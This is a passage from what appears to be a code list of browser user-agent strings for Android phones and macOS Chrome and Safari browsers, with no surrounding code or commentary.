    'Mozilla/5.0 (Linux; Android 11; BL8800Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; CPH1937) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.126 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; CPH1937) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.98 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; IN2021) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; M2004J19C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; M2007J20CG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; M2007J3SY) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; M2010J19CG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; M2102J20SG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; M2103K19PG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; Mi 9T Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; Mi A3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; moto g(9) play) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; ONEPLUS A6000) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; ONEPLUS A6010) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; ONEPLUS A6013) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; Pixel 2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; Redmi Note 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; Redmi Note 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; Redmi Note 9 Pro Max) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; Redmi Note 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; RMX1971) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; RMX1992) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; SHARK PRS-H0 Build/PROS2203060OS00MP5; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.105 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/387.0.0.22.106;]',
    'Mozilla/5.0 (Linux; Android 11; SM-A025F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; SM-A205F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; SM-A207M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; SM-G975U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; SM-G977B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; SM-M405F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; TECNO BD2d) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36 OPR/67.1.3508.63168',
    'Mozilla/5.0 (Linux; Android 12; 21081111RG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; 2201116SG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; 22041211AC Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko)  Chrome/96.0.4664.104 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; A063) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; CPH2205) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; CPH2251) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; DN2101) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; I2012) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; KB2001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; LE2101) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; LGE-AN00; HMSCore 6.8.0.312) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.105 HuaweiBrowser/12.1.4.302 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; M2007J20CI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; M2007J3SY) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.58 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; M2101K6G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; M2102J20SG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; moto g(60)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; moto g52) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; moto g52) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; MT2111) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; Pixel 3a XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; Redmi Note 9 Pro Max) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; Redmi Note 9S) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; RMX2151) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; RMX2170) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; RMX3360) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/19.0 Chrome/102.0.5005.125 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/19.0 Chrome/102.0.5005.125 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G988B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/19.0 Chrome/102.0.5005.125 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-S908U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/99.0.4844.88 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-A125F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-A127F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-A325F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-A336E) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-A525F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-A528B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-A715F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-A716B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.91 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-A736B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-F721N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-F936N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-F936N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-G780F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36 EdgA/107.0.1418.35',
    'Mozilla/5.0 (Linux; Android 12; SM-G970F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-G986U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-G990E) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-G991U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-G991U1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36 EdgA/107.0.1418.43',
    'Mozilla/5.0 (Linux; Android 12; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-G998U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-M315F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-N970F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-N975U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-N975W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-S901E) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-S901N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-S908E) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; V2203) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; vivo 1920) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; LE2123) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; M2102J20SG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.91 Mobile Safari/537.36 OPR/73.0.3788.68491',
    'Mozilla/5.0 (Linux; Android 13; Pixel 4a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; Pixel 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; Pixel 6a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/19.0 Chrome/102.0.5005.125 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; SM-S908E) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 7.0; Archos 97c Platinum) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5S)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 7.1.2; A0001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 8.0.0; AUM-AL20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 8.0.0; LG-H870DS Build/OPR1.170623.032) AppleWebKit/537.37 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 8.0.0; MHA-AL00 Build/HUAWEIMHA-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/68.0.3440.91 Mobile Safari/537.36 BingWeb/6.9.6',
    'Mozilla/5.0 (Linux; Android 8.0.0; SAMSUNG SM-A520F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/99.0.4844.88 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5 Plus) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 8.1.0; SM-J710F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 8.1.0; TECNO CA8S) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1820) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 9; ANE-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 9; INE-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 9; INE-LX2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 9; Mi 9T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 9; MRD-LX1F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Mobile Safari/537.36 EdgA/96.0.1054.53',
    'Mozilla/5.0 (Linux; Android 9; Redmi 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.99 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 9; Redmi Note 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 9; Redmi Y2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.99 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 9; SM-G950N Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.232 Whale/1.0.0.0 Crosswalk/26.90.3.33 Mobile Safari/537.36 NAVER(inapp; search; 1010; 11.17.3)',
    'Mozilla/5.0 (Linux; Android 9; SM-G970F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 9; STF-L09) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 9; T5 Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.105 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; arm_64; Android 12; M2101K6G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 YaBrowser/22.11.1.75.00 SA/3 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; U; Android 11; en-us; RMX3231 Build/RP1A.201005.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36 HeyTapBrowser/7.5.9',
    'Mozilla/5.0 (Linux; U; Android 8.0.0; zh-cn; Mi Note 2 Build/OPR1.170623.032) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.128 Mobile Safari/537.36 XiaoMi/MiuiBrowser/10.1.1',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 YaBrowser/22.11.0.2408 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.2 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6,2 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.3 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.114 YaBrowser/22.9.1.1079 Yowser/2.5 Safari/537.36',
